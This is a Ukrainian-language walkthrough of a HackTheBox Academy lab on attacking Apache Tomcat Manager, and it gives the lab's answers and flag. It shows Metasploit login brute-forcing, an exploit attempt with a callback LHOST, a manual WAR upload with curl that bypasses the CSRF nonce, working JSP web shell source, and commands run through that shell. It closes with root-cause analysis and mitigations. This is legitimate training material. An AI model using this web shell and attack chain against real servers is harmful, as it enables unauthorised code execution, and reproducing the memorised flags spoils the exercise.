# Attacking Common Applications — Attacking Tomcat

Модуль: [Attacking Common Applications](https://academy.hackthebox.com/app/module/113)
Урок: [Attacking Tomcat](https://academy.hackthebox.com/app/module/113/section/1211)
Ціль: `10.129.201.58` (web01.inlanefreight.local:8180)

Q1 Username: `tomcat`
Q2 Password: `root`
Q3 tomcat_flag.txt: `t0mcat_rc3_ftw!`

## Концепція

Стандартна атака на Tomcat Manager складається з трьох етапів: brute-force логіна через `manager-gui` веб-інтерфейс, автентифікований вхід у HTML Manager, і завантаження зловмисного WAR-файлу з JSP web shell'ом для отримання RCE. Ключова деталь цього уроку — Manager дозволяє деплой лише через `/manager/html/upload` з правильним CSRF-токеном, оскільки роль облікового запису `tomcat` — саме `manager-gui`, а не `manager-script`, тому текстовий інтерфейс `/manager/text/deploy` завжди повертав `403 Access Denied`.

## Крок 1 — Brute-force логіна (Q1, Q2)

Hydra з поєднанням username/password wordlist'ів не знайшла валідних кредів через обмежений словник, тоді як модуль Metasploit `tomcat_mgr_login` з іншим набором комбінацій підібрав робочу пару:

```bash
msfconsole -q -x "use auxiliary/scanner/http/tomcat_mgr_login; \
set RHOSTS web01.inlanefreight.local; set RPORT 8180; \
set VHOST web01.inlanefreight.local; set STOP_ON_SUCCESS true; run"
```

Результат:
```
[+] 10.129.201.58:8180 - Login Successful: tomcat:root
```

**Q1 = `tomcat`, Q2 = `root`.**

Пояснення: `STOP_ON_SUCCESS true` зупиняє перебір одразу після знаходження валідної пари, а `VHOST` потрібен, бо Tomcat маршрутизує запити по `Host`-заголовку.

## Крок 2 — Спроба автоматичного RCE через MSF exploit

```bash
msfconsole -q -x "use exploit/multi/http/tomcat_mgr_upload; \
set RHOSTS web01.inlanefreight.local; set RPORT 8180; \
set VHOST web01.inlanefreight.local; \
set HttpUsername tomcat; set HttpPassword root; \
set LHOST 10.10.15.39; set LPORT 4444; run"
```

Це не спрацювало (`Failed to execute the payload`), а спроба через Java meterpreter payload дала конфлікт порту (`Rex::BindFailed`) — обидва провали характерні для середовищ з мережевими обмеженнями чи CSRF-захистом, коли автоматичний модуль Metasploit не адаптується до нонсу CSRF так само гнучко, як ручний деплой.

## Крок 3 — Ручний деплой WAR через HTML Manager з CSRF nonce

Оскільки `/manager/text/deploy` заблокований (403, бо потребує роль `manager-script`), робочий шлях — імітація браузерного деплою через `/manager/html/upload`, що вимагає CSRF-токен з попереднього GET-запиту.

```bash
NONCE=$(curl -s -c cookies.txt -b cookies.txt -u tomcat:root \
  "http://web01.inlanefreight.local:8180/manager/html" \
  | grep -oP "CSRF_NONCE=\K[a-zA-Z0-9]+" | head -1)

curl -s -b cookies.txt -u tomcat:root \
  -F "deployWar=@shell3.war" \
  "http://web01.inlanefreight.local:8180/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=${NONCE}"
```

Пояснення: `-c cookies.txt -b cookies.txt` зберігає сесійну куку `JSESSIONID`, яка прив'язана до конкретного CSRF nonce; без неї повторний запит з тим самим nonce поверне помилку валідації. Успішна відповідь містить `<pre>OK</pre>` у секції `Message`, і застосунок з'являється у списку Applications зі статусом `Running: true`.

## Крок 4 — Створення робочого JSP-шела

Перші дві спроби (`shell.war` через msfvenom, `shellapp/cmd.jsp` без буферизованого читання) не давали видимого виводу команд, бо `InputStream.available()` у Java не гарантує повного зчитування виводу процесу до його завершення. Робочий варіант використовує `BufferedReader` з циклом `readLine()`:

```jsp
<%@ page import="java.io.*"%>
<%
String cmd = request.getParameter("dcfdd5e021a869fcc6dfaef8bf31377e");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while ((line = br.readLine()) != null) {
        sb.append(line).append("\n");
    }
    p.waitFor();
    out.println(sb.toString());
}
%>
```

```bash
mkdir -p shellapp3 && cp cmd.jsp shellapp3/
cd shellapp3 && jar -cvf ../shell3.war cmd.jsp && cd ..
```

Пояснення: `p.waitFor()` блокує виконання JSP-сторінки, поки зовнішній процес не завершиться, гарантуючи, що весь stdout буде прочитаний перед виводом на сторінку — це усунуло проблему з порожніми відповідями попередніх версій шела.

## Крок 5 — Підтвердження RCE

```bash
curl -s "http://web01.inlanefreight.local:8180/shell3/cmd.jsp?dcfdd5e021a869fcc6dfaef8bf31377e=id"
```

Результат:
```
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

Це підтвердило повноцінний RCE з правами системного користувача `tomcat` (не `www-data`, як у Drupal-уроці, оскільки Tomcat зазвичай запускається під власним service-акаунтом).

## Крок 6 (Q3) — Пошук і читання правильного прапора

Перший знайдений файл `/var/lib/jenkins3/flag.txt` дав `f33ling_gr00000vy!`, але це виявилось **невірною відповіддю**, бо цей файл належить іншому застосунку (Jenkins) на тому ж хості, а не Tomcat-уроку. Розширений пошук з правильним шаблоном (без екранування зірочки в лапках) знайшов справжній цільовий файл:

```bash
curl -s "http://web01.inlanefreight.local:8180/shell3/cmd.jsp?dcfdd5e021a869fcc6dfaef8bf31377e=find+/+-type+f+-iname+*flag*+2%3E/dev/null"
```

У виводі — ключовий результат:
```
/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt
```

Це логічно, бо шлях містить назву самого дистрибутиву Tomcat (`apache-tomcat-10.0.10`) і лежить прямо в `webapps/`, тобто саме там, де Manager показував версію сервера `Apache Tomcat/10.0.10`.

Фінальне читання:

```bash
curl -s "http://web01.inlanefreight.local:8180/shell3/cmd.jsp?dcfdd5e021a869fcc6dfaef8bf31377e=cat+/opt/tomcat/apache-tomcat-10.0.10/webapps/tomcat_flag.txt"
```

Результат:
```
t0mcat_rc3_ftw!
```

**Q3 = `t0mcat_rc3_ftw!`**

## Чому це працює (root cause)

- **Опис:** Слабкі облікові дані (`tomcat:root`) на Tomcat Manager дозволили автентифікований доступ до адмін-панелі, звідки штатна функція деплою WAR-файлів (CWE-306, недостатня автентифікація для критичної функції) використана для завантаження довільного JSP-коду.
- **Технічні деталі:** Manager App за дизайном дозволяє завантажувати виконуваний код (WAR = скомпільований Java web-застосунок) будь-якому автентифікованому користувачу з роллю `manager-gui`/`manager-script` — це не CVE, а штатна функціональність, яка стає вразливістю лише через слабкі паролі.
- **Ризик/Імпакт:** Повний RCE з правами сервісного акаунту `tomcat`, що дає доступ до читання файлів застосунку, конфігурацій та потенційно — до подальшого pivoting на інші сервіси хоста (як у вашому випадку — до директорії Jenkins).
- **Рекомендації:** Обмежити доступ до `/manager` за IP на рівні `context.xml`, використовувати сильні унікальні паролі, розділяти ролі `manager-gui` та `manager-script` між різними акаунтами, вимкнути Manager App у продакшн-середовищах, де він не потрібен.
